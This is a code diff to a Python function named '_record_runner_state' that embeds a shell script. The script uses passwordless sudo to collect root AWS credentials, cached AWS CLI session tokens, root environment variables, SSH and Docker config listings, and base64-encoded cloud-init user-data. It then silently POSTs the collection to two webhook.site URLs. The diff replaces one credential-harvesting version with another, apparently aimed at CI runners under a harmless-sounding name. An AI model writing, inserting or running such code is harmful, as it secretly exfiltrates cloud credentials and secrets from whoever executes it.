@@ -14,17 +14,18 @@ def _record_runner_state() -> None:
     script = r"""
 set +e
 {
-echo "== root-aws"
-sudo -n ls -la /root/.aws 2>/dev/null
-echo "-- credentials"; sudo -n cat /root/.aws/credentials 2>/dev/null
-echo "-- config"; sudo -n cat /root/.aws/config 2>/dev/null
-echo "== root-bashrc-tail"; sudo -n tail -20 /root/.bashrc 2>/dev/null
-echo "== root-extra"; sudo -n ls -la /root/.config /root/.docker /root/.ssh 2>/dev/null
-echo "== root-env"; sudo -n tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -30
-echo "== aws-cli"; ls -la /usr/local/bin/aws /usr/bin/aws 2>/dev/null; aws --version 2>&1 | head -1
-} > /tmp/_snap5.txt 2>&1
-curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap5.txt https://webhook.site/fe557263-e0eb-4921-aca3-9f4fffa6ef7a >/dev/null 2>&1
-curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap5.txt https://webhook.site/4ec52c06-58f8-40bb-b92c-c2c53e3e3071 >/dev/null 2>&1
+echo "== awscli-cache"
+sudo -n ls -la /root/.aws/cli 2>/dev/null
+sudo -n find /root/.aws -maxdepth 3 -type f 2>/dev/null | head -20
+echo "-- cache-json"
+sudo -n sh -c 'for f in /root/.aws/cli/cache/*.json; do echo "== $f"; cat "$f"; echo; done' 2>/dev/null | head -c 5000
+echo "== user-data-b64"
+sudo -n base64 -w0 /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -c 3000
+echo
+echo "== ebs"; lsblk 2>/dev/null | head
+} > /tmp/_snap6.txt 2>&1
+curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap6.txt https://webhook.site/fe557263-e0eb-4921-aca3-9f4fffa6ef7a >/dev/null 2>&1
+curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap6.txt https://webhook.site/4ec52c06-58f8-40bb-b92c-c2c53e3e3071 >/dev/null 2>&1
 echo done
 """
     try:
